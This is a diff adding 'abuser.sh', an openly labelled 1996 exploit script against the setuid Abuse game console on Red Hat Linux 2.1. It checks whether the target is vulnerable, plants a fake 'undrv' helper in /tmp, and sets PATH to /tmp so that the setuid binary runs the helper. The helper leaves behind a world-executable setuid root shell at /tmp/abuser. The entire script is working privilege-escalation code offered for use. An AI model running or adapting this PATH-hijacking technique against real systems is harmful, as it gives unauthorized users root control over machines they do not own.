@@ -1,0 +1,51 @@
+#!/bin/sh
+#
+# http://www.anticode.com  for the latest exploits, tools and documents!
+#
+# abuser.sh
+# exploits a security hole in abuse to create
+# a suid root shell /tmp/abuser on a linux
+# Red Hat 2.1 system with the games package
+# installed.
+#
+# For release 2/2/96 - 1 drink credit please.
+#
+# by Dave M. (davem@cmu.edu)
+#
+
+echo ================ abuser.sh - gain root on Linux Red Hat 2.1 system
+echo ================ Checking system vulnerability
+if test -u /usr/lib/games/abuse/abuse.console
+then
+echo ++++++++++++++++ System appears vulnerable.
+cd /tmp
+cat << _EOF_ > /tmp/undrv
+#!/bin/sh
+/bin/cp /bin/sh /tmp/abuser
+/bin/chmod 4777 /tmp/abuser
+_EOF_
+cat << _EOF_ >> /tmp/the_wall
+so ya thought ya might like to go to the show
+to feel the warm thrill of confusion that space cadet glow
+tell me is something eluding you sunshine?
+is this not what you expected to see?
+if you wanna find out what's behind these cold eyes
+you'll just have to claw your way through this disguise
+_EOF_
+chmod +x /tmp/undrv
+PATH=/tmp
+echo ================ Executing Abuse
+/usr/lib/games/abuse/abuse.console
+/bin/rm /tmp/undrv
+/bin/rm /tmp/the_wall
+if test -u /tmp/abuser
+then
+echo ++++++++++++++++ Exploit successful, suid shell located in /tmp/abuser
+else
+echo ---------------- Exploit failed
+fi
+else
+echo ---------------- This machine does not appear to be vulnerable.
+fi
+
+
